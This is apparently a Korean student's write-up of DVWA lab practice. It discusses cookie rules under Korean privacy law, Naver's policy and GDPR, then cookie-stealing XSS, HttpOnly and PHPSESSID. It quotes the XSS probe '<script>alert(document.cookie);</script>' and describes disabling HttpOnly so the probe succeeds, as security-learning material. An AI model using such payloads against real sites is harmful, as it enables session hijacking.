> *[개인정보 보호법」 제30조](https://www.law.go.kr/%EB%B2%95%EB%A0%B9/%EA%B0%9C%EC%9D%B8%EC%A0%95%EB%B3%B4%20%EB%B3%B4%ED%98%B8%EB%B2%95/%EC%A0%9C30%EC%A1%B0)*
> 

개인정보 보호법에 대해서 쿠키에 대한 명확한 정보를 알수 없어서 네이버의 쿠키 정책 또한 찾아 보았다.

> **쿠키의 설치 및 운영에 관한 사항**
> 
> 
> *네이버는 PC 환경과 동일·유사한 인터넷 환경을 모바일 서비스에서도 제공하기 위해 모바일 기기(예: 스마트 폰, 태블릿 PC)에서도 '쿠키(cookie)'를 사용합니다.*
> 
> *쿠키는 접속빈도, 이용한 네이버 서비스와 웹 사이트들에 대한 방문 및 이용형태, 인기 검색어, 접속 세션, 이용자 규모 등의 분석 및 서비스 이용 도중 로그인 유지 등을 통하여 이용자에게 최적화된 서비스를 제공하기 위하여 사용됩니다. 단, 모바일 기기에서의 쿠키 세션은 기기 특성 및 이용자 편의를 고려하여 일반 PC에서의*
> 
> *쿠키 세션보다 그 기간이 더 길게 유지될 수 있습니다.*
> 
>  *[개인정보취급방침 :: 네이버](https://policy.naver.com/rules/mobile_privacy_prev.html)*
> 

충분한 정보를 얻지 못하고 조사를 계속하던 도중 GDPR의 존재를 알게 되었다.

GDPR은 유럽 일반개인정보호법으로써 쿠키를 하나의 개인정보로 인식하여 사용자 동의 없이는 쿠키를 사용할 수 없으며 투명성과 쿠키의 보존 기간을 합리적으로 제한하는 등 쿠키에 대한 정책을 설정하는 법령이다.

하지만 한국의 경우 GDPR의 적용 범위가 아니며, 개인정보 보호법이 존재하지만 인식 부족과 기업의 준수 문제 등으로 현재로써는 사용자의 쿠키를 동의 없이 사용하는 경우도 있다고 한다.

쿠키를 탈취하는 다양한 공격과 쿠키를 활용한 공격에 대해 실습했다. 이번 실습을 진행하면서 이러한 상황에 대해 인식의 개선의 여지가 필요하다고 실감하게 되었다. 

보안과 해킹 기술을 배우는 것은 단순히 외부의 공격에 대한 방지책만 제공하는 것이 아닌 이러한 취약점에 대해 외부에 알리고 사회적 인식을 촉구하는 역할 또한 포함되어 있다는 것을 알게 되었다.

### 쿠키와 HttpOnly

*3-1. Reflected XSS* 에서, 쿠키 정보를 얻기 위해 `alert(document.cookie)` 명령어를 이용해 시도했지만 실패했다. 

처음에는 DVWA의 문제라고 추측했으나 *document.cookie* 명령어에 대해 조사해본 결과 쿠키에 `HttpOnly` 옵션이 설정되어 있었기 때문이라는 것을 알게 되었다. 

`HttpOnly` 옵션은 XSS 공격을 막기 위한 옵션으로, 클라이언트에서 HTTP 통신 외에는 쿠키에 접근할 수 없도록 한다. 따라서 `HttpOnly` 옵션이 설정된 쿠키는 `javascript`를 통해 접근이 불가능하기 때문에 시도했던 공격이 실패한 것이다. 

Firefox의 확장 프로그램인 *cookie-editor*를 이용해 쿠키 정보를 확인해 보니 `HttpOnly` 옵션이 설정되어 있었고, 옵션을 해제하고 공격에 성공할 수 있었다.

### **쿠키와 PHPSESSID의 차이**

`<script>alert(document.cookie);</script>` 명령어를 실행했지만 출력되는 정보는 PHPSESSID인 것에 대해 의문을 품을 수밖에 없었다. 

이 차이점에 대해 탐구해본 결과 쿠키는 웹 서버에서 클라이언트 측에서 저장되는 데이터 조각이며 PHPSESSID는 세션 측에서 클라이언트와 서버간의 세션 식별에 사용되는 식별자임을 알게 되었다. 

보안 측면에서는 쿠키는 사용자에게 저장 되기에 보안성이 낮지만 PHPSESSID 는 서버측에 저장되기에 보안성이 높다는 차이점이 있다. 

둘은 저장과 사용 기능적으로는 분명한 차이가 있지만 데이터 저장, 정보 전송, 정보 유지 등 공통점이 많으며 XSS 공격을 통해 얻을 수 있는 취약점이 있다고 판단하였기에 그대로 실습을 진행하였다.

---

## 참고자료

*개인정보보호법 제30조.국가법령정보센터*

*개인정보취급방침.국가법령정보센터*

*[Cross-site scripting - Wikipedia](https://en.wikipedia.org/wiki/Cross-site_scripting) . 위키피디아*

*[DVWA - XSS (Low)](https://velog.io/@catcatcatcatcat/DVWA-XSS-Low). velog*

*[Damn Vulnerable Web Application (DVWA)](https://github.com/digininja/DVWA). Github*

*[php SESSION에 대하여, 취약점](https://watchout31337.tistory.com/151). 티스토리*
